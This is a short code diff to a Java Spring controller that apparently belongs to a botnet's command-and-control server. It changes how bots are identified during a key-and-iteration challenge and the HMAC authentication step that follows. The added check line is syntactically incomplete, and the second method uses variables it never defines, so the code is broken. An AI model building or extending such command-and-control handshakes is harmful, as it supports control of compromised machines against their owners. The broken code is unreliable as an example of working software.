@@ -72,7 +72,7 @@ public class CommandController {
     		if(engineBot.isCommandandconquerStatus()){
     			Long keyNumber=new Long(auth.generateNumberText());    	
     	    	Long iterationNumber=new Long(auth.generateIterationNumber());   
-    	    	auth.addBotChallengeInfo(request.getRemoteHost(),keyNumber, iterationNumber);   	    	
+    	    	auth.addBotChallengeInfo(request.getRemoteAddr(),keyNumber, iterationNumber);   	    	
     	    	response=new Pairs<Long, Long>(keyNumber,iterationNumber);
     		}else{
     			error.sendError(HttpStatus.SC_NOT_FOUND);
@@ -84,12 +84,12 @@ public class CommandController {
     
     @RequestMapping(value = "/welcome/hmac", method = RequestMethod.POST)
    	@ResponseBody
-   	public String botFirstAccesSecondPhase(String hashMac, HttpServletResponse error) throws IOException {  
+   	public String botFirstAccesSecondPhase(String hashMac, HttpServletResponse error,HttpServletRequest request) throws IOException {  
     	String response="";
 		System.out.println("3");
 
     	if(engineBot.isCommandandconquerStatus()){
-    	
+    			if(auth.findBotChallengeInfo(request.getRemoteAddr())
     			if(auth.validateHmac(keyNumber, iterationNumber, hashMac))
     				response="Challenge OK";
     	}else{
